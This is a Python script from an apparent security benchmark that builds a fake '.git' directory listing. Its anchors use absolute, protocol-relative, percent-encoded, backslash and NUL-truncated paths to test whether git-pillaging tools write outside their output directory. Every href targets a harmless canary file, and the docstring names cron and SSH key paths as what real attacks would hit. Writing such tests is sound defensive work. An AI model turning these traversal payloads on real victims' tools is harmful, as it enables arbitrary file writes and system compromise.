"""Generate a payload that lures a recursive pillager into writing
outside its output directory via *absolute*-path anchors in a fake HTML
directory listing.

This is the sibling of ``C1_html_traversal``.  C1 covers the relative
``../`` climb family; C4 covers the distinct primitive where the
malicious server hands the pillager an *absolute* path — a leading
``/``, a protocol-relative ``//``, an encoded ``%2f`` root, or a
backslash root — rather than a relative climb.  A tool that joins a
server-controlled absolute path onto (or in place of) its output
directory escapes regardless of how carefully it strips ``..``.

Layout served by evil_server (static mode):

    payload/
      .git/
        HEAD                # so the pillager treats this as a repo
        config              # innocent
        index.html          # the lure: many absolute-href variants
      canary/
        PWNED_C4            # served to whoever fetches /canary/PWNED_C4

Detectability — why every href targets ``/canary/PWNED_C4``
-----------------------------------------------------------
The benchmark runner mounts the per-tool canary directory at the
container-absolute path ``/canary`` (``-v <canary_dir>:/canary``).  A
true arbitrary-absolute-write (e.g. to ``/etc/cron.d/x`` or
``/root/.ssh/authorized_keys``) would land in the container's root
filesystem, which is discarded when the ``--rm`` container exits and is
therefore invisible to the oracle.  Pointing the absolute targets at the
already-mounted ``/canary`` keeps the *primitive* identical (the tool
still honours a server-controlled absolute path) while making the
escaping write land in a directory the default oracle can inspect: if
``/canary/PWNED_C4`` appears, some absolute href was honoured.

All firing variants resolve (via ``urljoin`` against the ``/.git/``
listing URL) to ``http://<server>/canary/PWNED_C4``, which the static
server answers from ``payload/canary/PWNED_C4``.  GitHacker strips the
leading ``/`` (``urlparse(path)[len(origin_path):]``) and writes the
result *under* its output dir, so the canary never appears — the
expected PASS.  Encoded / protocol-relative / backslash variants are
included for corpus coverage the same way C1 carries documentary
patterns; whichever a given vulnerable tool honours fires the canary.
"""
from __future__ import annotations

import shutil
from pathlib import Path

HERE = Path(__file__).resolve().parent
PAYLOAD = HERE / 'payload'

# Every href below aims at /canary/PWNED_C4.  Any success creates the
# canary file and the default oracle flags FAIL.
HREFS = [
    # 1. Plain absolute path — the base case.
    '/canary/PWNED_C4',

    # 2. Absolute with dot-noise that canonicalises back to /canary.
    '/./canary/PWNED_C4',
    '/canary/./PWNED_C4',
    '/canary/../canary/PWNED_C4',

    # 3. Absolute with a leading climb — "can't go above root" pins these
    #    back to /canary, but a tool that resolves them on the filesystem
    #    side (joined onto a deeper cwd) still escapes.
    '/../canary/PWNED_C4',
    '/../../../../../../canary/PWNED_C4',
    '/.git/../canary/PWNED_C4',

    # 4. Protocol-relative // and backslash-root — host/segment confusion;
    #    a parser that treats the leading // or \ as "absolute on this
    #    host" writes to /canary.
    '//canary/PWNED_C4',
    '/\\canary\\PWNED_C4',

    # 5. Encoded leading separator — the absolute-path counterpart of
    #    C1's encoded-relative class; honoured by tools that decode before
    #    deciding "is this absolute?".
    '%2fcanary%2fPWNED_C4',
    '/%2e/canary/PWNED_C4',
    '/%2e%2e/canary/PWNED_C4',

    # 6. Backslash root (Windows-style absolute) — a tool that folds "\"
    #    -> "/" sees \canary\... as an absolute root.
    '\\canary\\PWNED_C4',
    '\\\\canary\\\\PWNED_C4',

    # 7. NUL truncation on an absolute path — terminate at the NUL and the
    #    surviving prefix is still an absolute /canary write.
    '/canary/PWNED_C4%00.git',
    '/%00/canary/PWNED_C4',
]

_ANCHORS = '\n'.join(f'<a href="{h}">PWNED_C4</a>' for h in HREFS)
INDEX_HTML = (
    '<!DOCTYPE html>\n'
    '<html>\n'
    '<head><title>Index of /.git/</title></head>\n'
    '<body><h1>Index of /.git/</h1><hr><pre>\n'
    '<a href="HEAD">HEAD</a>\n'
    '<a href="config">config</a>\n'
    f'{_ANCHORS}\n'
    '</pre><hr></body></html>\n'
)

CONFIG = """[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tlogallrefupdates = true
"""


def main() -> None:
    if PAYLOAD.exists():
        shutil.rmtree(PAYLOAD)
    git_dir = PAYLOAD / '.git'
    git_dir.mkdir(parents=True)
    (git_dir / 'HEAD').write_text('ref: refs/heads/main\n')
    (git_dir / 'config').write_text(CONFIG)
    (git_dir / 'index.html').write_text(INDEX_HTML)

    canary_dir = PAYLOAD / 'canary'
    canary_dir.mkdir()
    (canary_dir / 'PWNED_C4').write_text('PWNED via absolute-path anchor\n')

    print(f"Built C4 payload at {PAYLOAD} ({len(HREFS)} href variants)")


if __name__ == '__main__':
    main()
